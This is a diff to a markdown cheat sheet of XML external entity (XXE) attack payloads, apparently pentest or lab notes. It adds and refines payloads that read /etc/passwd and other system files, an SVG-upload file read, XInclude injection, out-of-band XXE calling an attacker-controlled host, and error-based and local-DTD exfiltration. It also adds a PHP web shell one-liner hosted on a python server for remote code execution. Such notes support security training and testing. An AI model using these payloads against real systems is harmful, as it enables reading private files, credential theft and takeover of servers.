@@ -9,7 +9,7 @@ Directory listing:
 Listing etc Directory:
 ```XML
 <?xml version="1.0" encoding="UTF-8"?>
-<?DOCTYPE root[<!ENTITY xxe SYSTEM “file:///etc/”>]>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <root><foo>&xxe;</foo></root>
 ```
 
@@ -31,7 +31,7 @@ LFI using ENTITY... Will have to include the entity name in the xml request some
 <!DOCTYPE email [<!ENTITY company SYSTEM "file:///etc/passwd">]>
 ```
 
-Image SVG upload for LFI
+Image SVG upload for LFI. Image returns the contents if vulnerable:
 ```XML
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
@@ -40,7 +40,7 @@ Image SVG upload for LFI
 </svg>
 ```
 
-Xinclude:
+Xinclude can be used when you dont control the entire XML document and are unable to define a DOCTYPE. This gets placed into the parameter like an injection:
 ```XML
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/passwd"/></foo>
@@ -62,12 +62,19 @@ Read PHP sourcecode via HTTP request
 
 Creating an XML ENTITY. Add this at the top of the fields and then reference it &ENTITY; to display
 ```XML
-<!DOCTYPE email [
-  <!ENTITY company "Inlane Freight">
-]>
+<!DOCTYPE email [<!ENTITY company "Inlane Freight"> ]>
 ```
 
-Uploading reverse shell via XML
+##### Uploading reverse shell via XML:
+Create a payload for RCE:
+```BASH
+echo '<?php system($_REQUEST["cmd"]);?>'
+```
+Then start a python server or something to host it:
+```bash
+sudo python3 -m http.server 8080
+```
+Then run the following Entity (spaces are filled with $IFS to not break the parsing):
 ```XML
 <?xml version="1.0"?>
 <!DOCTYPE email [
@@ -99,4 +106,42 @@ XXE DoS
 ]>
 ```
 
+Out of band XXE. This allows you to store a DTD on your own server and then call this:
+```XML
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+```
 
+
+
+Error based XXE, trigger an error with the contents you want to get:
+```XML
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+
+#### Re-purposing local DTD for error based xxe
+
+First you have to find a local DTD that exists on this system. Look up common .dtd files and check if they exist (will see error if the file is not there):
+```XML
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+```
+
+Then research of existing entities in that file online, and send the blind error:
+```XML
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+<!ENTITY % custom_entity '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
